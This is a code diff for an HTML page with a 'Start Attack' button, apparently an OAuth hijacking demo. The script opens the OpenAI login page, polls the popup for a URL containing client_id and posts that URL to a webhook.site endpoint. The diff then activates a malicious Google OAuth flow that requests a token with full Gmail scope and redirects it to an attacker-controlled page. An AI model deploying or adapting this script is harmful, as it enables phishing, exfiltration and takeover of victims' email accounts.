@@ -8,31 +8,34 @@
   <button id="startAttack">Start Attack</button>
 
   <script>
+    const openaiLogin = "https://auth.openai.com/log-in";
+    const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
+    const webhook = "https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df"; // Replace with your own
+
     document.getElementById("startAttack").addEventListener("click", function () {
-      const loginTarget = "https://auth.openai.com/log-in";
-      const webhook = "https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df"; // Replace with your own if needed
+      const openaiWindow = window.open(openaiLogin, "_blank", "width=900,height=700");
 
-      const win = window.open(loginTarget, "_blank", "width=900,height=700");
-
+      // Try to capture the client_id from OpenAI login window
       const interval = setInterval(() => {
         try {
-          const redirectedUrl = win.location.href;
+          const href = openaiWindow.location.href;
 
-          if (redirectedUrl.includes("client_id")) {
+          if (href.includes("client_id")) {
             clearInterval(interval);
 
-            // Send captured client_id URL to webhook
+            // Send OpenAI client_id to the webhook
             fetch(webhook, {
               method: "POST",
               headers: { "Content-Type": "text/plain" },
-              body: `Captured URL: ${redirectedUrl}`
+              body: `OpenAI client_id URL: ${href}`
             });
 
-            // Optional: redirect to a malicious OAuth flow
-            // win.location.replace("https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F");
+            // Close original window and open the malicious OAuth window
+            openaiWindow.close();
+            const maliciousWin = window.open(maliciousOAuthUrl, "_blank", "width=900,height=700");
           }
-        } catch (err) {
-          // Cross-origin frame access error — expected until we hit same-origin
+        } catch (e) {
+          // Cross-origin: wait for URL to be same-origin or accessible
         }
       }, 1000);
     });
